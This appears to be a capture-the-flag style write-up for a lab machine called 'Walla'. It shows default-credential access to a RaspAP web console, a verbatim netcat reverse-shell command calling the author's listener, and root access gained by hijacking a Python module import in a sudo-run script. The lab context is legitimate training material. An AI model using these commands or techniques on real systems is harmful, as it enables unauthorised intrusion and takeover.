Walla

Target IP: 192.168.152.97

Scanning


There are seven TCP ports open on the target machine. I will start enumeration with the HTTP application on port 8091.

Enumeration

Port 8091: HTTP

The nmap scan from previous section states the target host is running Lighttpd/1.4.53. Browsing to this port requests me to login. I tried default credentials, such as admin:admin, but I had no luck.


Using curl, I identified what application is running on this port by the header field WWW-Authenticate. It looks like RaspAP is running on this port.


I found the default credentials are admin:secret for this application using Google. And spraying this worked as I have access to the application on this port. Time to enumerate further.

Exploitation


There is an interactive console that can be used inside System. I ran the commands whoami and id and received the output above. It looks like the current user that is logged in is www-data. I should be able to obtain a reverse shell connection through this console.


Payload used: nc 192.168.45.173 8443 -e /bin/bash.
I used the payload above to gain a reverse shell connection. I deployed the payload using the console and received a shell on port 8443. Now I have a foothold on the machine.

Privilege Escalation


Looks like the Python script called wifi_reset.py can be used for PE.


The script wifi_reset.py tries to import a module called wificontroller; therefore, a reverse shell script can be placed inside this module. After putting my Python reverse shell script inside this module, I opened a listener on 8444, and ran the script with sudo to gain a root shell.

Flags


The local.txt flag once I gained a foothold on the machine.


The proof.txt flag once I created a malicious module with reverse shell script inside it, and ran the Python script to gain a root shell.
